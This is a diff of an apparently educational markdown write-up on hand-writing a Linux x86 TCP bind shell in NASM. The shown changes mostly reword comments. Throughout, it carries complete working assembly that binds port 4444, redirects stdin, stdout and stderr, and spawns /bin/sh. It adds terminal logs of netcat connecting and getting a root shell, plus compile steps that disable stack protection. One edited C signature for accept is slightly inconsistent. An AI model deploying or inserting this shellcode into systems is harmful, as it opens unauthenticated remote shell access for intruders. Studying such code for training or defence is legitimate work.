@@ -363,8 +363,8 @@ mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. We
 push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
 push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
 push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
-mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
-int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
+mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack.
+int 0x80          ; System Call Interrupt 0x80 
 ```
 
 ### 4. Listen for incoming connections on the TCP-IP Socket
@@ -402,7 +402,7 @@ int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Conn
 ### 5. Accept the incoming connections, on the TCP-IP Socket, and create a new connected session
 #### C Function
 ```c
-int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
 ```
 #### Our C Function        
 ```c
@@ -429,8 +429,8 @@ push ecx         ; ECX[2]. Push the value 0x0 to the stack.
 push ecx         ; ECX[1]. Push the value 0x0 to the stack.
 push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
 mov ecx, esp     ; Point ECX to the top of the stack. 
-int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
-xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a successful connection.
+int 0x80         ; System Call Interrupt 0x80 
+xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.
 ```
 
 ### 6. Transfer Standard-Input, Standard-Output, and Standard-Error to the connected session
@@ -455,7 +455,8 @@ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
 + EBX = int oldfd = clientSocket
   - Already set with `xchg ebx, eax` after the execution of `accept()`.  
 + ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0
-  - Since we need to do this SYSCAL 3 times, we will use a loop.  
+  - Since we need to do this SYSCAL 3 times, we will use a loop.
+
 ```nasm  
  xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
  xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros). 
@@ -523,8 +524,8 @@ section .text
 
 _start:
 ; 1. Create a new Socket
-;<socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
-;  EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
+; <socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
+;   EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
 xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
 mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
 xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
@@ -543,10 +544,11 @@ xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register.
                   ;   Move it to the ESI Register; we will need it later.
 
 ; 2+3. Create TCP-IP Address and Bind the Address to the Socket
-; struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY };
-;                                              ARG[0]               ARG[1]                          ARG[2]
+; struct sockaddr_in ipSocketAddr = { 
+; .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY};
+;       ARG[0]               ARG[1]                          ARG[2]
 ;<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
-;  EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2]
+;  EAX=0x66      EBX   ECX[0]                   ECX[1]                   ECX[2]
 xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
 mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
 xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
@@ -556,16 +558,18 @@ push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
 push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
 push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
 xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
-mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. We will use this for ECX[1].
+mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. 
+                  ;   We will use this for ECX[1].
 push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
-push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
+push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now 
+                  ;   loaded up for ECX[1].
 push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
-mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
-int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
+mov ecx, esp      ; Now we need to point ECX to the top of the loaded stack.
+int 0x80          ; System Call Interrupt 0x80
 
 ; 4. Listen for incoming connections on TCP-IP Socket.
 ; <socketcall>   listen( ipv4Socket, 0 );  
-;  EAX=0x66       EBX      ECX[0]   ECX[1]  
+;   EAX=0x66      EBX      ECX[0]   ECX[1]  
 xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
 mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
 xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
@@ -578,7 +582,7 @@ int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Conn
 
 ; 5. Accept the incoming connections, on the TCP-IP Socket, and create a new connected session.
 ; <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL ); 
-;EAX=0x66                        EBX     ECX[0]    ECX[1] ECX[2] 
+;   EAX=0x66                     EBX     ECX[0]    ECX[1] ECX[2] 
 xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
 mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall 
 xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
@@ -588,8 +592,8 @@ push ecx         ; ECX[2]. Push the value 0x0 to the stack.
 push ecx         ; ECX[1]. Push the value 0x0 to the stack.
 push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
 mov ecx, esp     ; Point ECX to the top of the stack.
-int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets.
-xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a successful connection.
+int 0x80         ; System Call Interrupt 0x80 
+xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a connection.
 
 ; 5. Transfer STDIN, STDOUT, STDERR to the connected Socket.
 ; dup2( clientSocket, 0 ); // STDIN 
@@ -610,7 +614,7 @@ jns dup2Loop   ; Jump back to the dup2Loop Procedure until ECX equals 0.
 ; 7. Spawn a "/bin/sh" shell for the client, in the connected session. 
 ; execve("/bin//sh", NULL, NULL);
 ;  EAX      EBX       ECX   EDX
-push edx         ; Push NULL onto the stack because the string needs to be NULL Terminated.
+push edx         ; Push NULL to terminate the string.
 push 0x68732f2f	 ; "hs//" - Needs to be 4 bytes to fit on stack properly
 push 0x6e69622f  ; "nib/" - This is "/bin//sh" backwards.
 mov ebx, esp     ; point ebx to stack where /bin//sh +\x00 is located
@@ -634,7 +638,7 @@ ld bindShell.o -o bindShell
 #### Terminal Window 2
 ```console
 root# netstat -tnalp | grep 4444
-tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      7760/bindShell
+tcp     0    0 0.0.0.0:4444     0.0.0.0:*   LISTEN   7760/bindShell
 root# nc.traditional 127.0.0.1 4444
 id
 uid=0(root) gid=0(root) groups=0(root)
@@ -694,13 +698,11 @@ root# gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
 ```console
 root# ./shellcode 
 Shellcode Length:  114
-
-
 ```
 #### Terminal Window 2
 ```console
 root# netstat -tnalp | grep shellcode
-tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      19143/shellcode 
+tcp      0      0 0.0.0.0:4444     0.0.0.0:*   LISTEN    19143/shellcode 
 root# nc.traditional 127.0.0.1 4444
 id
 uid=0(root) gid=0(root) groups=0(root)
